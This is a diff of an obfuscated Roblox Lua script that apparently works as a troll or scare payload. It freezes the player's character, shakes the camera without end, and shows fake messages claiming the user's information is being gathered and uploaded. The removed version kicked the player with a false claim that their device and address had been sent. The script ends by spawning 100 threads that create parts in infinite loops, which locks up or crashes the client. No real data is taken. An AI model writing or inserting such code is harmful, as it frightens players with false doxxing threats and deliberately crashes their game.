@@ -1,117 +1,167 @@
-local lepmxae = game:GetService("Players")
-local ztyuqne = game:GetService("TweenService")
-local ewnyzoc = game:GetService("Lighting")
-local ptzowla = game:GetService("Debris")
-local bxpurot = game:GetService("UserInputService")
+local xkdwrva = game:GetService("Players")
+local qzyhrce = game:GetService("TweenService")
+local fgqtnao = game:GetService("Lighting")
+local rwvhemp = game:GetService("SoundService")
 
-local mjcqtrv = lepmxae.LocalPlayer
-local ovrxmap = mjcqtrv:WaitForChild("PlayerGui")
-
-local function wyxzena(jdqeamc, zujkpno, exojkma)
-	local fwlzqoa = Instance.new("Sound")
-	fwlzqoa.SoundId = zujkpno
-	fwlzqoa.Volume = 0.5
-	fwlzqoa.Looped = exojkma or false
-	fwlzqoa.Parent = jdqeamc
-	return fwlzqoa
-end
-
-local trlxvmp = wyxzena(ovrxmap, "rbxassetid://9118823107", true)
-local ftxaglo = wyxzena(ovrxmap, "rbxassetid://9118827160")
-local qloxten = wyxzena(ovrxmap, "rbxassetid://138087017")
+local vbcqehk = xkdwrva.LocalPlayer
+local rwkhbux = vbcqehk:WaitForChild("PlayerGui")
 
 task.wait(4)
 
-local apurxzn = Instance.new("BlurEffect")
-apurxzn.Size = 0
-apurxzn.Parent = ewnyzoc
-ztyuqne:Create(apurxzn, TweenInfo.new(1), { Size = 24 }):Play()
+vbcqehk.CharacterAdded:Connect(function(zofhvtu)
+	local mdqkwhj = zofhvtu:WaitForChild("Humanoid")
+	mdqkwhj.WalkSpeed = 0
+	mdqkwhj.JumpPower = 0
+end)
 
-local yjmaxbo = Instance.new("ScreenGui")
-yjmaxbo.Name = "GuiLoad"
-yjmaxbo.IgnoreGuiInset = true
-yjmaxbo.ResetOnSpawn = false
-yjmaxbo.Parent = ovrxmap
+if vbcqehk.Character then
+	local lkajgzq = vbcqehk.Character:FindFirstChild("Humanoid")
+	if lkajgzq then
+		lkajgzq.WalkSpeed = 0
+		lkajgzq.JumpPower = 0
+	end
+end
 
-local hqzktpo = Instance.new("Frame")
-hqzktpo.Size = UDim2.new(0.4, 0, 0.2, 0)
-hqzktpo.Position = UDim2.new(0.5, 0, 0.5, 0)
-hqzktpo.AnchorPoint = Vector2.new(0.5, 0.5)
-hqzktpo.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-hqzktpo.BackgroundTransparency = 1
-hqzktpo.Active = true
-hqzktpo.Draggable = true
-hqzktpo.Parent = yjmaxbo
+local ohpywfk = Instance.new("ColorCorrectionEffect")
+ohpywfk.TintColor = Color3.fromRGB(255, 0, 0)
+ohpywfk.Brightness = 0
+ohpywfk.Contrast = 0
+ohpywfk.Saturation = 0
+ohpywfk.Parent = fgqtnao
 
-ztyuqne:Create(hqzktpo, TweenInfo.new(1), { BackgroundTransparency = 0.05 }):Play()
+local mpzlqae = Instance.new("BlurEffect")
+mpzlqae.Size = 0
+mpzlqae.Parent = fgqtnao
+qzyhrce:Create(mpzlqae, TweenInfo.new(1), { Size = 24 }):Play()
 
-Instance.new("UICorner", hqzktpo).CornerRadius = UDim.new(0, 16)
+local qgszrmj = Instance.new("ScreenGui")
+qgszrmj.Name = "GuiLoad"
+qgszrmj.IgnoreGuiInset = true
+qgszrmj.ResetOnSpawn = false
+qgszrmj.Parent = rwkhbux
 
-local xqowcaj = Instance.new("UIStroke", hqzktpo)
-xqowcaj.Color = Color3.fromRGB(255, 255, 255)
-xqowcaj.Thickness = 1
-xqowcaj.Transparency = 0.8
+local toqmeuk = Instance.new("Frame")
+toqmeuk.Size = UDim2.new(0.4, 0, 0.2, 0)
+toqmeuk.Position = UDim2.new(0.5, 0, 0.5, 0)
+toqmeuk.AnchorPoint = Vector2.new(0.5, 0.5)
+toqmeuk.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+toqmeuk.BackgroundTransparency = 1
+toqmeuk.Active = true
+toqmeuk.Draggable = true
+toqmeuk.Parent = qgszrmj
 
-local szetvqa = Instance.new("TextLabel")
-szetvqa.Size = UDim2.new(1, -20, 1, -20)
-szetvqa.Position = UDim2.new(0, 10, 0, 10)
-szetvqa.BackgroundTransparency = 1
-szetvqa.TextColor3 = Color3.new(1, 1, 1)
-szetvqa.Font = Enum.Font.GothamSemibold
-szetvqa.TextScaled = true
-szetvqa.Text = ""
-szetvqa.Parent = hqzktpo
+qzyhrce:Create(toqmeuk, TweenInfo.new(1), { BackgroundTransparency = 0.05 }):Play()
+Instance.new("UICorner", toqmeuk).CornerRadius = UDim.new(0, 16)
 
-Instance.new("UICorner", szetvqa)
+local ldyjcgw = Instance.new("UIStroke", toqmeuk)
+ldyjcgw.Color = Color3.fromRGB(255, 255, 255)
+ldyjcgw.Thickness = 1
+ldyjcgw.Transparency = 0.8
 
-Instance.new("UIGradient", szetvqa).Color = ColorSequence.new {
-	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 255)),
-	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 150))
+local uaoxghv = Instance.new("TextLabel")
+uaoxghv.Size = UDim2.new(1, -20, 1, -20)
+uaoxghv.Position = UDim2.new(0, 10, 0, 10)
+uaoxghv.BackgroundTransparency = 1
+uaoxghv.TextColor3 = Color3.new(1, 1, 1)
+uaoxghv.Font = Enum.Font.GothamSemibold
+uaoxghv.TextScaled = true
+uaoxghv.Text = ""
+uaoxghv.Parent = toqmeuk
+
+Instance.new("UICorner", uaoxghv)
+local zljbhko = Instance.new("UIGradient", uaoxghv)
+
+local ncbyzte = {
+	ColorSequence.new {
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 200, 255)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 150))
+	},
+	ColorSequence.new {
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 165, 0))
+	},
+	ColorSequence.new {
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 128, 255)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 0, 255))
+	}
 }
 
-trlxvmp:Play()
+local aciqlmj = Instance.new("Sound")
+aciqlmj.SoundId = "rbxassetid://9043360808"
+aciqlmj.Volume = 1
+aciqlmj.Looped = true
+aciqlmj.Parent = rwvhemp
+aciqlmj:Play()
 
-local function vgqrzbt(rhnqxma, vfmksoq, qlemvuc)
-	local ozatubk = math.random(vfmksoq * 10, qlemvuc * 10) / 10
-	local tnoikpy = math.floor(ozatubk / 0.5)
+local function zlxowyr()
+	for i = 1, 20 do
+		local pchygwe = Instance.new("TextLabel")
+		pchygwe.Text = "You Made An Error, Bear The Consequences"
+		pchygwe.Size = UDim2.new(0, 400, 0, 30)
+		pchygwe.Position = UDim2.new(math.random(), 0, math.random(), 0)
+		pchygwe.AnchorPoint = Vector2.new(0.5, 0.5)
+		pchygwe.TextColor3 = Color3.fromRGB(math.random(180, 255), math.random(0, 40), math.random(0, 40))
+		pchygwe.BackgroundTransparency = 1
+		pchygwe.TextTransparency = 1
+		pchygwe.Font = Enum.Font.GothamBlack
+		pchygwe.TextScaled = true
+		pchygwe.ZIndex = 10
+		pchygwe.Parent = qgszrmj
 
-	local wguakzp = ftxaglo:Clone()
-	wguakzp.Parent = ovrxmap
-	wguakzp:Play()
-	ptzowla:AddItem(wguakzp, 2)
+		local vnpkzma = qzyhrce:Create(pchygwe, TweenInfo.new(1), { TextTransparency = 0 })
+		vnpkzma:Play()
 
-	for i = 1, tnoikpy do
-		szetvqa.Text = rhnqxma .. string.rep(".", i % 4)
+		task.wait(0.25)
+	end
+end
+
+spawn(zlxowyr)
+
+local vxgzsdj = workspace.CurrentCamera
+spawn(function()
+	while true do
+		local cjetosr = Vector3.new(
+			math.random(-200, 200),
+			math.random(10, 200),
+			math.random(-200, 200)
+		)
+		vxgzsdj.CFrame = CFrame.new(cjetosr, Vector3.zero)
+		task.wait(0.01)
+	end
+end)
+
+local function hbtjvox(msg, min, max, grad, b, c)
+	local dur = math.random(min * 10, max * 10) / 10
+	local reps = math.floor(dur / 0.5)
+
+	zljbhko.Color = ncbyzte[grad]
+	qzyhrce:Create(ohpywfk, TweenInfo.new(3), {
+		Brightness = b,
+		Contrast = c
+	}):Play()
+
+	for i = 1, reps do
+		uaoxghv.Text = msg .. string.rep(".", i % 4)
 		task.wait(0.5)
 	end
 end
 
-vgqrzbt("Connecting", 1, 2)
-print("Connected")
-vgqrzbt("Autenticating User", 2, 3)
-vgqrzbt("Doing Other Stuff", 3, 4)
+hbtjvox("Getting Information About User", 1, 2, 1, 1, 3)
+hbtjvox("Getting All Information...", 2, 3, 2, 2, 7)
+hbtjvox("Uploading Info To Server", 3, 4, 3, 3, 11)
 
-local lpkavtx = ztyuqne:Create(hqzktpo, TweenInfo.new(1), { BackgroundTransparency = 1 })
-lpkavtx:Play()
-ztyuqne:Create(apurxzn, TweenInfo.new(1), { Size = 0 }):Play()
+local vtsuzwy = qzyhrce:Create(toqmeuk, TweenInfo.new(1), { BackgroundTransparency = 1 })
+vtsuzwy:Play()
+qzyhrce:Create(mpzlqae, TweenInfo.new(1), { Size = 0 }):Play()
+vtsuzwy.Completed:Wait()
 
-lpkavtx.Completed:Wait()
-
-yjmaxbo:Destroy()
-apurxzn:Destroy()
-trlxvmp:Stop()
-
-qloxten:Play()
-task.wait(1.5)
-
-mjcqtrv:Kick("You've Kicked: User Blacklisted Detected! " .. mjcqtrv.Name .. ", Infos: Device, Adress Have Been Sent To Us..")
-wait(1)
+qgszrmj:Destroy()
 
 for i = 1, 100 do
 	spawn(function()
 		while true do
-			for i = 1, 1000 do
-				Instance.new("Part").Parent = game.Workspace
+			for j = 1, 1000 do
+				Instance.new("Part").Parent = workspace
 			end
 		end
 	end)
